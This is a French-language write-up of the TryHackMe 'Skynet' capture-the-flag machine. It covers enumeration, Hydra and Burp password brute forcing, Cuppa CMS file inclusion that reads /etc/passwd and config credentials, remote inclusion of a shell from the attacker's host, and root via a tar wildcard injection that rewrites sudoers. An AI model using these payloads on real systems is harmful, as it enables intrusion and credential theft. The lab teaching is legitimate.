# Skynet
> A vulnerable Terminator themed Linux machine.

https://tryhackme.com/room/skynet


10.10.11.76

## nmap

```
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        syn-ack Dovecot pop3d
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack Dovecot imapd
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

## gobuster 

```
kali@kali:~/thm/skynet$ gobuster dir -w /opt/directory-list-2.3-medium.txt -u 10.10.11.76
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.11.76
[+] Threads:        10
[+] Wordlist:       /opt/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/21 16:47:29 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
===============================================================
2020/06/21 16:59:32 Finished
===============================================================
```

## enum4linux

```
S-1-22-1-1001 Unix User\milesdyson (Local User)
S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)
S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)
```

Le serveur expose plusieurs partages windows : 

```
print$          Disk      Printer Drivers
anonymous       Disk      Skynet Anonymous Share
milesdyson      Disk      Miles Dyson Personal Share
IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```

L'accès au partage `milesdyson` requiert un mot de passe.

```
kali@kali:~/thm/skynet/smb/anonymous$ smbclient //10.10.11.76/milesdyson
Enter WORKGROUP\kali's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Par contre l'accès au partage `anonymous` est open 

kali@kali:~/thm/skynet$ smbclient //10.10.11.76/anonymous
smb: \> dir
  .                                   D        0  Wed Sep 18 00:41:20 2019
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
  books                               D        0  Wed Sep 18 00:40:06 2019


Téléchargement des fichiers du partage.

```sh
smbget -R smb://10.10.11.76/anonymous
```

Le partage contient, entre autre, un fichier `log1.txt` contenant ce qui semble être une  liste de mot de passe.

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

[Using thc-hydra to brute force some commom service (FTP/SSH/SMB/POP3/Telnet/RDP/HTTP)](https://securityonline.info/using-thc-hydra-brute-force-commom-service-ftpsshsmbpop3telnetrdphttp/)

## Attaque !


### Brute force SMB avec Hydra

```
hydra -l milesdyson -P smb/anonymous/logs/log1.txt -v -V 10.10.11.76 smb -f
(...)
1 of 1 target completed, 0 valid passwords found
```

### Brute force POP3 avec Hydra

```
hydra -l milesdyson -P smb/anonymous/logs/log1.txt -v -V 10.10.11.76 pop3 -f -s 110
(...)
1 of 1 target completed, 0 valid passwords found
```

### Brute force squirrelmail avec Burpsuite

Capture de la requete de Login

```
POST /squirrelmail/src/redirect.php HTTP/1.1
Host: 10.10.11.76
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.76/squirrelmail/src/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Connection: close
Cookie: SQMSESSID=ce5hj3us4949lsbtbsebp5cle5
Upgrade-Insecure-Requests: 1

login_username=milesdyson&secretkey=&js_autodetect_results=1&just_logged_in=1
```

Envoi de la requete au module Intruder

Ajout de la variable 'password'

`login_username=milesdyson&secretkey=§password§&js_autodetect_results=1&just_logged_in=1`

Chargement de la liste des mots de passe (payload) à partir du fichier `log1.txt`

Start attack

> Le mot de passe du compte mail de Miles est **cyborg007haloterminator**

### Analyse des emails 

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

```
kali@kali:~/thm/skynet/smb/anonymous$ smbclient //10.10.11.76/milesdyson -U milesdyson
Enter WORKGROUP\kali's password: )s{A&2Z=F^n_E.B`
mb: \> dir
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

		9204224 blocks of size 1024. 5352552 blocks available

```

Téléchargement des fichiers du partage.

```sh
smbget -R smb://10.10.11.76/milesdyson -U milesdyson
```

Parmis les fichiers du partage, le fichier `notes/important.txt` contient : 

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

http://10.10.11.76/45kra24zxs28v3yd/

> Le dossier caché sur serveur web est **/45kra24zxs28v3yd**

Les deux autres emails contiennent des truc chelou ... a voir plus tard si bloqué.

Tentative de connexion via SSH avec le compte `milesdyson` et le mot de passe `)s{A&2Z=F^n_E.B`` ... failed.


### Next ? Gobuster sur le nouveau dossier trouvé, qui seleon le mail est un CMS.


http://10.10.11.76/45kra24zxs28v3yd/administrator/


La page "cache" le lien vers la fonction de réinitialisation du mot de passe.

Appel de la fonction via lde debuger de chrome + envoi @ l'email `milesdyson@skynet` et `milesdyson@localhost` => failed.

Une recherche sur exploitdb d'un exploit Cuppa CMS : 
https://www.exploit-db.com/exploits/25971

```
An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
```


http://10.10.11.76/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
```

http://10.10.11.76/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php

```
echo "PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg==" | base64 -d

<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
?>
```

Test inclusion remote php file : OK

http://10.10.11.76/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.11.184/phpinfo.php

http://10.10.11.76/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.11.184/shell.php

```sh
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell upgrade 

```sh
$ python -c 'import pty; pty.spawn("/bin/bash")'
^Z
[1]+  Stopped                 nc -lnvp 7777
kali@kali:~/thm/skynet/smb/milesdyson$ stty raw -echo
www-data@skynet:/$ 
```

```sh
www-data@skynet:/home/milesdyson$ cat user.txt 
7ce5c2109a40f958099283600a9ae807
```

## Privesc

```sh
www-data@skynet:/home/milesdyson$ cd /dev/shm/               
www-data@skynet:/dev/shm$ wget http://10.9.11.184/linpeas.sh
--2020-06-21 17:16:38--  http://10.9.11.184/linpeas.sh
Connecting to 10.9.11.184:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 175073 (171K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 170.97K  --.-KB/s    in 0.1s    

2020-06-21 17:16:39 (1.67 MB/s) - 'linpeas.sh' saved [175073/175073]

www-data@skynet:/dev/shm$ chmod +x linpeas.sh 
```

```
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
```

```
www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e

```
cd /var/www/html
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1
```

Wait....

```
www-data@skynet:/var/www/html$ sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL

www-data@skynet:/var/www/html$ sudo bash

root@skynet:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

```
root@skynet:~# cat root.txt 
3f0372db24753accc7179a282cd6a949
```





https://www.hackingarticles.in/5-ways-to-hack-smb-login-password/
